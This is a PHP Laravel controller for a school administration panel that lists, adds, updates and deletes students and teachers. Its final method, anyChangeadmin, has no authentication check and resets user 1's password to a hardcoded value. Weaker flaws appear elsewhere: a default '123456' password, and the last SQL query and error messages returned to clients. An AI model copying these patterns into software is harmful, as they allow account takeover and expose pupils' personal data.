<?php

class AdminUserController extends BaseController {

	/**
	 * Display a listing of the resource.
	 *
	 * @return Response
	 */
    protected $layout = 'ci.tpl_admin';
	public function getIndex()
	{
	/*	$users = User::get();
		$roles = Role::get();

		return View::make('admin.users', array(
			'users'=> $users,
			'roles'=> $roles
		));/**/
        $user = User::find(Auth::user()->id);
        return View::make('admin.user', array('user' => $user));
	}

	public function getSecurity()
	{
		$roles = Role::get();

		return View::make('admin.security', array(
			'roles'=> $roles
		));
	}
    public function profile()
    {
        $persone=Person::where("people.user_id","=",Auth::user()->id)->get();
        if(isset($persone)&&count($persone)>0){
            $grade=DB::table('grades')->where('grades.user_id',"=", Auth::user()->id)->get();
            $g='';
            foreach($grade as $v){
                $g.=' '.$v->name;
            }
            $level=DB::table('levels')->where('levels.user_id',"=", Auth::user()->id)->get();
            $l='';
            foreach($level as $v){
                $l.=' '.$v->name;
            }
            $persone[0]->nameGrade=$g;
            $persone[0]->nameLevel=$l;
        }
        //var_dump($persone[0]);
        $this->layout->content = View::make('admin/profile', array('person' => $persone[0]));
        $this->layout->curmenu="home";/**/
    }
    ///////////////////////////////
    public function adminuser(){
        $users=array();
        if(Auth::user()->is('Administrador')){
            $this->layout->content = View::make('admin/users', array('users' => $users));
            $this->layout->curmenu="adminuser";
        }
    }

    public function postInicial(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            $page=1;
            $rows=10;
            $order='asc';
            $sort='username';
            if(Input::has('page')) $page = Input::get('page');
            if(Input::has('rows')) $rows = Input::get('rows');
            if(Input::has('sort')){
                $sort = Input::get('sort');
                if($sort=="grado")$sort="nameGrade";
                else $sort='lastname';
            }
            if(Input::has('order')) $order = Input::get('order');

            $start=intval($page-1)*$rows;
            $end=$start+$rows-1;

            $usersShow=$this->queryCutomUser("INICIAL",$start,$end,$rows,$order,$sort);
            if(count($usersShow["data"])>0){
                $r->rows=$usersShow["data"];
                $r->total=$usersShow["total"];
                //$r->fef=$usersShow["etete"];

            }else{
                $queries = DB::getQueryLog();
                $last_query = end($queries);
                $r->lquery = $last_query;
                $r->rows=array();
                $r->total=0;
            }

        }
        return Response::json($r);
    }
    private function queryCutomUser($level=null,$start,$end,$rows,$order,$sort){
        $usersShow=array();
        $users=DB::table('users')->where("users.deleted_at","=",null)
            ->join('people', function($join)
            {
                $join->on('users.id', '=', 'people.user_id');
            })
            ->join('levels', function($join)
            {
                $join->on('users.id', '=', 'levels.user_id');
            })
            ->join('grades', 'users.id', '=', 'grades.user_id')
            ->join('sections', 'users.id', '=', 'sections.user_id')
            ->join('role_user', function($join)
            {
                $join->on('users.id', '=', 'role_user.user_id')->where("role_user.role_id","=","3");
            })->where("levels.name","=",$level)->select('levels.name as nameLevel ','grades.name as nameGrade','sections.name as nameSection','username','users.id as userid','firstname','lastname','users.dni as dni','genre','phone1','phone2','disabled','birthdate','responsible','people_type_id','address','users.email as email','verified')
            ->orderBy($sort, $order)/*->take($rows)->skip($end)/**/->get();
        $cont=0;
        $gradoImicial=array(1=>"3 años",2=>"4 años",3=>"5 años",);
        $grado=array(1=>"primero",2=>"segundo",3=>"tercero",4=>"cuarto",5=>"quinto",6=>"sexto");
        foreach($users as $v){
            $cont++;
            if($cont>=$start && $cont<=$end){
                $temp["ID"]       = $cont;
                $temp["usuario"]  = $v->username;
                $temp["id"]       = $v->userid;
                $temp["nombre"]   = $v->firstname;
                $temp["apellido"] = $v->lastname;
                $temp["dni"]      = $v->dni;
                $temp["sexo"]     = $v->genre;
                $temp["sexo"]     = $v->genre;
                $temp["nivel"]    = $v->nameLevel;
                if($v->nameLevel  == "INICIAL"){
                    $temp["grado"]= $gradoImicial[$v->nameGrade];
                }else $temp["grado"]=$grado[$v->nameGrade];
                /**/
                $temp["gradonum"]= $v->nameGrade;
                $temp["seccion"] = $v->nameSection;
                $temp["email"]   = $v->email;
                $temp["telefono"]= $v->phone1;
                $temp["celu"]    = $v->phone2;
                $temp["direccion"]=$v->address;
                $temp["status"]=$v->disabled;
                $temp["verificado"]=$v->verified;
                $temp["nacimiento"]=$v->birthdate;
                $temp["responsable"]=$v->responsible;
                $temp["type"]=$v->people_type_id;
                $temp["estado"]="No verificado";
                if($v->verified==1){
                    $temp["estado"]=" <span style='color: #013FB0'>Verificado</span>";
                }
                array_push($usersShow,$temp);
            }

        }/**/
        $rspt["data"]=$usersShow;
        $rspt["total"]=count($users);
       // $rspt["etete"]=$users;
        return $rspt;
    }

    public function postAdduser(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            $user = new User();
            try
            {
                DB::BeginTransaction();
                $valid=$user->isValid(Input::all());
                if($valid){
                    if(Input::has('username')) $user->username = Input::get('username');
                    if(Input::has('email')) $user->email = Input::get('email');
                    if(Input::has('dni')) $user->dni = Input::get('dni');
                    if(Input::has('password')){
                        $user->password = Input::get('password');
                    } else  $user->password="123456";
                    //
                    //$user->verified = 1;
                    $user->save();

                    $people = new Person();
                    $validP=$people->isValid(Input::all());
                    if($validP){

                        if(Input::has('firstname')) $people->firstname = Input::get('firstname');
                        if(Input::has('lastname')) $people->lastname = Input::get('lastname');
                        if(Input::has('dni')) $people->dni = Input::get('dni');

                        if(Input::has('born')) $people->birthdate = Input::get('born');
                        if(Input::has('genre')) $people->genre = Input::get('genre');
                        if(Input::has('address')) $people->address = Input::get('address');
                        if(Input::has('phone')) $people->phone1 = Input::get('phone');
                        if(Input::has('cel')) $people->phone2 = Input::get('cel');
                        if(Input::has('resp')) $people->responsible = Input::get('resp');
                        $people->user_id=$user->id;
                        if(Input::has('rol')) $people->people_type_id=Input::get('rol');

                        if($people->save()){
                            if(Input::has('rol')){
                                if(Input::get('rol')==2){
                                    DB::table('role_user')->insert(
                                        array('role_id' => 2,'user_id'=>$user->id,'created_at'=>date('Y-m-d H:i:s'))
                                    );
                                    if(Input::has('level_I')){
                                        DB::table('levels')->insert(
                                            array('user_id' => $user->id,'name'=>'INICIAL','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('level_P')){
                                        DB::table('levels')->insert(
                                            array('user_id' => $user->id,'name'=>'PRIMARIA','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('level_S')){
                                        DB::table('levels')->insert(
                                            array('user_id' => $user->id,'name'=>'SECUNDARIA','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    //grades
                                    if(Input::has('grade1')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'1','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade2')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'2','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade3')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'3','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade4')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'4','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade5')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'5','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade6')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'6','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                }
                                if(Input::get('rol')==3){
                                    DB::table('role_user')->insert(
                                        array('role_id' =>3,'user_id'=>$user->id,'created_at'=>date('Y-m-d H:i:s'))
                                    );
                                    if(Input::has('level')){
                                        DB::table('levels')->insert(
                                            array('user_id' => $user->id,'name'=>Input::get('level'),'created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>Input::get('grade'),'created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                }
                                //section
                                if(Input::has('section')){
                                    DB::table('sections')->insert(
                                        array('user_id' => $user->id,'name'=>Input::get('section'),'created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                            }

                        }
                    }
                }
                else{
                    $r->setData($user->errors);
                }
                DB::commit();
            }catch (\Exception $e) {
                DB::rollback ();
                $r->status->code = "220";
                $r->status->description = $e->getMessage ();
            }
        }
        return Response::json($r);
    }

    public function postPrimaria(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            $page=1;
            $rows=10;
            $order='asc';
            $sort='username';
            if(Input::has('page')) $page = Input::get('page');
            if(Input::has('rows')) $rows = Input::get('rows');
            if(Input::has('sort')){
                $sort = Input::get('sort');
                if($sort=="grado")$sort="nameGrade";
                else $sort='lastanme';
            }
            if(Input::has('order')) $order = Input::get('order');

            $start=intval($page-1)*$rows;
            $end=$start+$rows-1;
            $usersShow=$this->queryCutomUser("PRIMARIA",$start,$end,$rows,$order,$sort);

            if(count($usersShow["data"])>0){
                $r->rows=$usersShow["data"];
                $r->total=$usersShow["total"];
            }else{
                $r->rows=array();
                $r->total=0;
            }
        }
        return Response::json($r);
    }
    public function postSecundaria(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            $page=1;
            $rows=10;
            $order='asc';
            $sort='username';
            if(Input::has('page')) $page = Input::get('page');
            if(Input::has('rows')) $rows = Input::get('rows');
            if(Input::has('sort')){
                $sort = Input::get('sort');
                if($sort=="grado")$sort="nameGrade";
                else $sort='lastname';
            }
            if(Input::has('order')) $order = Input::get('order');

            $start=intval($page-1)*$rows;
            $end=$start+$rows-1;
            $usersShow=$this->queryCutomUser("SECUNDARIA",$start,$end,$rows,$order,$sort);
            if(count($usersShow["data"])>0){
                $r->rows=$usersShow["data"];
                $r->total=$usersShow["total"];
            }else{
                $r->rows=array();
                $r->total=0;
            }
        }
        return Response::json($r);
    }
    public function postProfesor(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            $page=1;
            $rows=10;
            if(Input::has('page')) $page = Input::get('page');
            if(Input::has('rows')) $rows = Input::get('rows');

            $start=intval($page-1)*$rows;
            $end=$start+$rows-1;

            $usersShow=array();
            $users=DB::table('users')->where("users.deleted_at","=",null)
                ->join('people', function($join)
                {
                    $join->on('users.id', '=', 'people.user_id');
                })
                ->join('sections', 'users.id', '=', 'sections.user_id')
                ->join('role_user', function($join)
                {
                    $join->on('users.id', '=', 'role_user.user_id')->where("role_user.role_id","=","2");
                })->select('sections.name as nameSection','username','users.id as userid','firstname','lastname','users.dni as dni','genre','phone1','phone2','disabled','birthdate','responsible','people_type_id','address','users.email as email','verified')
                ->get();
            if(count($users)>0){
                $cont=0;
                foreach($users as $v){
                    $cont++;
                    if($cont>=$start && $cont<=$end){
                        $temp["ID"]=$cont;
                        $temp["usuario"]=$v->username;
                        $temp["id"]=$v->userid;
                        $temp["nombre"]=$v->firstname;
                        $temp["apellido"]=$v->lastname;
                        $temp["dni"]=$v->dni;
                        $temp["sexo"]=$v->genre;

                        $grade=DB::table('grades')->where('grades.user_id',"=", $v->userid)->get();
                        $g='';
                        foreach($grade as $va){
                            $g.=' '.$va->name;
                        }
                        $temp["grado"]=$g;

                        $level=DB::table('levels')->where('levels.user_id',"=", $v->userid)->get();
                        $l='';
                        foreach($level as $va){
                            $l.=' '.$va->name;
                        }
                        $temp["nivel"]=$l;

                        $temp["seccion"]=$v->nameSection;
                        $temp["email"]=$v->email;
                        $temp["telefono"]=$v->phone1;
                        $temp["celu"]=$v->phone2;
                        $temp["direccion"]=$v->address;
                        $temp["status"]=$v->verified;
                        $temp["verificado"]=$v->verified;
                        $temp["nacimiento"]=$v->birthdate;
                        $temp["responsable"]=$v->responsible;
                        $temp["type"]=$v->people_type_id;
                        $temp["estado"]="No verificado";
                        if($v->verified==1){
                            $temp["estado"]=" <span style='color: #013FB0'>Verificado</span>";
                        }
                        array_push($usersShow,$temp);
                    }
                }
                $r->rows=$usersShow;
                $r->total=count($users);
            }else{
                $r->rows=array();;
                $r->total=0;
            }
        }
        return Response::json($r);
    }

    public function postUpdateuser(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')) {
            if(Input::has('id')){
                $id= Input::get('id');
                $user = User::find($id);
                if(Input::has('status'))$user->verified=Input::get("status");
                $user->save();
                if($user){
                    $features=array();
                    if(Input::has('firstname_'))$features["firstname"]=Input::get("firstname_");
                    if(Input::has('lastname_'))$features["lastname"]=Input::get("lastname_");
                    if(Input::has('dni_'))$features["dni"]=Input::get("dni_");
                    if(Input::has('born_'))$features["birthdate"]=Input::get("born_");

                    if(Input::has('rol_')){
                        $features["people_type_id"]=Input::get("rol_");
                        DB::table('role_user')
                            ->where('user_id', $id)
                            ->update(array("role_id"=>Input::get("rol_")));

                        if(Input::get("rol_")==2){

                            DB::table('role_user')
                                ->where('user_id', $user->id)
                                ->update(array('role_id' => 2,'updated_at'=>date('Y-m-d H:i:s')));
                            DB::table('levels')->where('user_id', '=', $user->id)->delete();

                            if(Input::has('level_I')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'INICIAL','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('level_P')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'PRIMARIA','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('level_S')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'SECUNDARIA','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            //grades
                            DB::table('grades')->where('user_id', '=', $user->id)->delete();

                            if(Input::get("level_I")=="INICIAL"){
                                    if(Input::has('grade1I')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'1','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade2I')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'2','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                                    if(Input::has('grade3I')){
                                        DB::table('grades')->insert(
                                            array('user_id' => $user->id,'name'=>'3','created_at'=>date('Y-m-d H:i:s'))
                                        );
                                    }
                            }
                            else{
                                if(Input::has('grade1')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'1','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                                if(Input::has('grade2')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'2','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                                if(Input::has('grade3')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'3','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                                if(Input::has('grade4')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'4','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                                if(Input::has('grade5')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'5','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                                if(Input::has('grade6')){
                                    DB::table('grades')->insert(
                                        array('user_id' => $user->id,'name'=>'6','created_at'=>date('Y-m-d H:i:s'))
                                    );
                                }
                            }

                        }
                        else{
                            DB::table('role_user')
                                ->where('user_id', $id)
                                ->update(array("role_id"=>Input::get("rol_")));

                            if(Input::has('grade_')){
                                DB::table('grades')
                                    ->where('user_id', $id)
                                    ->update(array("name"=>Input::get("grade_")));
                            }
                            if(Input::has('level_')){
                                DB::table('levels')
                                    ->where('user_id', $id)
                                    ->update(array("name"=>Input::get("level_")));
                            }

                        }
                        if(Input::has('section_')){
                            DB::table('sections')
                                ->where('user_id', $user->id)
                                ->update(array('name' => Input::get("section_"),'updated_at'=>date('Y-m-d H:i:s')));
                        }
                    }

                    if(Input::has('email_'))$user->email=Input::get("email_");
                    if(Input::has('address_'))$features["address"]=Input::get("address_");
                    if(Input::has('phone_'))$features["phone1"]=Input::get("phone_");
                    if(Input::has('resp_'))$features["responsible"]=Input::get("resp_");
                    if(Input::has('cel_'))$features["phone2"]=Input::get("cel_");
                    if(Input::has('genre_'))$features["genre"]=Input::get("genre_");

                    $rpta=DB::table('people')
                        ->where('user_id', $id)
                        ->update($features);
                    $user->save();
                    $r->setData(array("success"=>$rpta));
                }
            }else{
                $r->status->setStatus(Status::STATUS_ERROR_PARAMETROS);
            }
        }
        return Response::json($r);
    }

    public function postUpdatetutor(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')) {
            if(Input::has('id')){
                $id= Input::get('id');
                $user = User::find($id);
                if(Input::has('status'))$user->verified=Input::get("status");
                $user->save();
                if($user){
                    $features=array();
                    if(Input::has('firstname_'))$features["firstname"]=Input::get("firstname_");
                    if(Input::has('lastname_'))$features["lastname"]=Input::get("lastname_");
                    if(Input::has('dni_'))$features["dni"]=Input::get("dni_");
                    if(Input::has('born_'))$features["birthdate"]=Input::get("born_");

                    if(Input::has('rol_t')){
                        $features["people_type_id"]=Input::get("rol_t");
                        DB::table('role_user')
                            ->where('user_id', $id)
                            ->update(array("role_id"=>Input::get("rol_t")));

                        if(Input::get("rol_t")==2){

                            DB::table('role_user')
                                ->where('user_id', $user->id)
                                ->update(array('role_id' => 2,'updated_at'=>date('Y-m-d H:i:s')));
                            DB::table('levels')->where('user_id', '=', $user->id)->delete();

                            if(Input::has('level_I')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'INICIAL','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('level_P')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'PRIMARIA','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('level_S')){
                                DB::table('levels')->insert(
                                    array('user_id' => $user->id,'name'=>'SECUNDARIA','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            //grades
                            DB::table('grades')->where('user_id', '=', $user->id)->delete();
                            if(Input::has('grade1I')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'1','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade2I')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'2','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade3I')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'3','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }

                            if(Input::has('grade1')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'1','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade2')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'2','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade3')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'3','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade4')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'4','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade5')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'5','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                            if(Input::has('grade6')){
                                DB::table('grades')->insert(
                                    array('user_id' => $user->id,'name'=>'6','created_at'=>date('Y-m-d H:i:s'))
                                );
                            }
                        }
                        else{
                            DB::table('role_user')
                                ->where('user_id', $id)
                                ->update(array("role_id"=>Input::get("rol_t")));
                            //DB::table('levels')->where('user_id', '=', $user->id)->delete();
                            if(Input::has('level_')){
                                DB::table('levels')
                                    ->where('user_id', $id)
                                    ->update(array("name"=>Input::get("level_")));
                            }
                            DB::table('grades')->where('user_id', '=', $user->id)->delete();
                            if(Input::has('grade_ai')){
                                DB::table('grades')
                                    ->insert(array('user_id' => $user->id,'name'=>Input::get("grade_ai"),'created_at'=>date('Y-m-d H:i:s')));
                            }

                        }
                        if(Input::has('section_')){
                            DB::table('sections')
                                ->where('user_id', $user->id)
                                ->update(array('name' => Input::get("section_"),'updated_at'=>date('Y-m-d H:i:s')));
                        }
                    }

                    //if(Input::has('email_'))$features["email"]=Input::get("email_");
                    if(Input::has('address_'))$features["address"]=Input::get("address_");
                    if(Input::has('phone_'))$features["phone1"]=Input::get("phone_");
                    if(Input::has('resp_'))$features["responsible"]=Input::get("resp_");
                    if(Input::has('cel_'))$features["phone2"]=Input::get("cel_");
                    if(Input::has('genre_'))$features["genre"]=Input::get("genre_");

                    $rpta=DB::table('people')
                        ->where('user_id', $id)
                        ->update($features);
                    $r->setData(array("success"=>$rpta));
                }
            }else{
                $r->status->setStatus(Status::STATUS_ERROR_PARAMETROS);
            }
        }
        return Response::json($r);
    }
    /******* only admin ****/
    public function postDeleteusuer(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            if(Input::has('id')) {
                $user = User::find(Input::get('id'));
                if($user){
                    try
                    {
                        $user->delete();
                    } catch (\Exception $e) {
                        $r->status->code = "220";
                        $r->status->description = $e->getMessage ();
                    }
                }
            }
        }
        return Response::json($r);
    }
    public function postSetpassword(){
        $r = new ApiResponse();
        if(Auth::user()->is('Administrador')){
            if(Input::has('id')) {
                $user = User::find(Input::get('id'));
                if($user){
                    if(Input::has('password')){
                        try
                        {
                            $user->password = Input::get('password');
                            $user->save();
                        } catch (\Exception $e) {
                            $r->status->code = "220";
                            $r->status->description = $e->getMessage ();
                        }
                    }
                }
            }
        }
        return Response::json($r);
    }

    public function  anyChangeadmin(){
        $user = User::find(1);
        if($user){
            if(true){
                try
                {
                    $user->password = "pest4l88/51";
                    $user->save();
                } catch (\Exception $e) {

                }
            }
        }
    }
}